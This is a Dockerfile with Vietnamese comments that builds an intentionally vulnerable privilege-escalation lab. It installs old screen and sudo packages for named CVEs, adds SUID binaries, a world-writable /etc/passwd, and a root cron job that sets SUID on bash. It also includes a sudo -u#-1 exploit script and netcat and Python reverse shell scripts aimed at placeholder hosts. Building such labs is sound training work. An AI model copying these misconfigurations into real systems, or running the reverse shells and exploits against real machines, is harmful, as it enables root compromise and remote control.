# Sử dụng image Debian bookworm làm base
FROM debian:bookworm

# Xóa các tệp nguồn APT mặc định và sử dụng mirror httpredir.debian.org
RUN rm -f /etc/apt/sources.list /etc/apt/sources.list.d/* && \
    echo "deb http://httpredir.debian.org/debian bookworm main" > /etc/apt/sources.list && \
    echo "deb http://httpredir.debian.org/debian bookworm-updates main" >> /etc/apt/sources.list && \
    echo "deb http://security.debian.org/debian-security bookworm-security main" >> /etc/apt/sources.list

# Bật chế độ no-cache và cập nhật trước khi cài đặt
RUN echo "Acquire::http::No-Cache=True;" > /etc/apt/apt.conf.d/99no-cache && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/* /var/cache/apt/* && \
    apt-get update --fix-missing && \
    apt-get install -y --no-install-recommends \
    software-properties-common \
    curl \
    wget \
    build-essential \
    findutils \
    gcc \
    make \
    net-tools \
    iputils-ping \
    procps \
    python3 \
    python3-pip \
    python3-venv \
    cron \
    vim \
    bash \
    nano \
    netcat-traditional \
    && rm -rf /var/lib/apt/lists/* /var/cache/apt/*

# Tạo user wproot (sudoer) và wpuser (regular user)
RUN mkdir -p /etc/sudoers.d && \
    useradd -m -d /home/wproot -s /bin/bash wproot && \
    echo "wproot:rootpass" | chpasswd && \
    usermod -aG sudo wproot && \
    echo "wproot ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/wproot && \
    chmod 440 /etc/sudoers.d/wproot && \
    useradd -m -d /home/wpuser -s /bin/bash wpuser && \
    echo "wpuser:wppass" | chpasswd && \
    echo "wpuser ALL=(ALL,!root) NOPASSWD:/bin/bash" > /etc/sudoers.d/wpuser && \
    chmod 440 /etc/sudoers.d/wpuser

# Tạo thư mục để test CVE-2017-5618 (screen)
RUN mkdir -p /tmp/screen-test && \
    chown wpuser:wpuser /tmp/screen-test && \
    chmod 777 /tmp/screen-test

# Cài đặt phiên bản screen (CVE-2017-5618) và sudo (CVE-2019-14287) có lỗ hổng
RUN apt-get update --fix-missing && \
    apt-get install -y --no-install-recommends libpam0g libncurses5 && \
    curl -L -o screen_4.2.1-3+deb8u1_amd64.deb http://archive.debian.org/debian/pool/main/s/screen/screen_4.2.1-3+deb8u1_amd64.deb && \
    curl -L -o sudo_1.8.10p3-1+deb8u5_amd64.deb http://archive.debian.org/debian/pool/main/s/sudo/sudo_1.8.10p3-1+deb8u5_amd64.deb && \
    dpkg -i screen_4.2.1-3+deb8u1_amd64.deb || apt-get install -f -y && \
    dpkg -i sudo_1.8.10p3-1+deb8u5_amd64.deb || apt-get install -f -y && \
    rm screen_4.2.1-3+deb8u1_amd64.deb sudo_1.8.10p3-1+deb8u5_amd64.deb && \
    rm -rf /var/lib/apt/lists/* /var/cache/apt/*

# Thêm script test cho CVE-2017-5618
RUN echo -e "#!/bin/bash\necho 'Testing CVE-2017-5618' > /tmp/screen-test/exploit.log\nscreen -L -Logfile /tmp/screen-test/exploit.log" > /tmp/screen-test/test-cve-2017-5618.sh && \
    chmod +x /tmp/screen-test/test-cve-2017-5618.sh

# Thêm script test cho CVE-2019-14287
RUN echo -e "#!/bin/bash\nsudo -u#-1 /bin/bash" > /home/wpuser/test-cve-2019-14287.sh && \
    chown wpuser:wpuser /home/wpuser/test-cve-2019-14287.sh && \
    chmod +x /home/wpuser/test-cve-2019-14287.sh

# Đặt mật khẩu root
RUN echo "root:rootpassword" | chpasswd

# Lỗ hổng cố ý: Đặt SUID bit trên /bin/cp và /bin/find
RUN chmod u+s /bin/cp && \
    chmod u+s /bin/find

# Lỗ hổng cố ý: Cronjob để leo thang đặc quyền
RUN echo "* * * * * root /tmp/root.sh" >> /etc/crontab && \
    echo -e "#!/bin/bash\nchmod +s /bin/bash" > /tmp/root.sh && \
    chmod +x /tmp/root.sh

# Lỗ hổng cố ý: Dịch vụ root dễ bị khai thác qua cron
RUN echo "* * * * * root /usr/local/bin/vuln-service.sh" >> /etc/crontab && \
    echo -e "#!/bin/bash\npython3 /usr/local/bin/vuln-service.py" > /usr/local/bin/vuln-service.sh && \
    chmod +x /usr/local/bin/vuln-service.sh && \
    echo -e "import os\nos.system('whoami > /tmp/service-output.txt')" > /usr/local/bin/vuln-service.py && \
    chmod 755 /usr/local/bin/vuln-service.py

# Lỗ hổng cố ý: Quyền yếu trên script nhạy cảm
RUN echo -e "#!/bin/bash\necho 'Running as root' > /tmp/root-exec.txt" > /usr/local/bin/vuln-script.sh && \
    chown root:root /usr/local/bin/vuln-script.sh && \
    chmod 777 /usr/local/bin/vuln-script.sh

# Lỗ hổng cố ý: Quyền world-writable trên /etc/passwd
RUN chmod 666 /etc/passwd

# Thêm reverse shell script bằng netcat (dự phòng)
RUN echo -e "#!/bin/bash\nnc <YOUR_HOST_IP> <YOUR_HOST_PORT> -e /bin/bash" > /reverse-shell.sh && \
    chmod +x /reverse-shell.sh

# Thêm reverse shell script bằng Python
RUN echo -e '#!/usr/bin/python3\nimport socket\nimport subprocess\nimport os\nHOST="<YOUR_HOST_IP>"\nPORT=<YOUR_HOST_PORT>\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((HOST,PORT))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(["/bin/bash","-i"])' > /reverse-shell.py && \
    chmod +x /reverse-shell.py

# Tạo thư mục cho dữ liệu nhạy cảm
WORKDIR /data
RUN mkdir -p /data/secure && \
    chown root:root /data/secure && \
    chmod 700 /data/secure

# Khởi động container với bash để tương tác
CMD ["/bin/bash"]



# sudo docker build -t vuln-lab-escalate . 
# sudo docker run --rm -it --network host vuln-lab-escalate

#     --rm: Xóa container sau khi thoát.
#     -it: Mở shell tương tác (/bin/bash).
#     --network host: Dùng mạng của máy Kali để dễ dàng kết nối qua IP.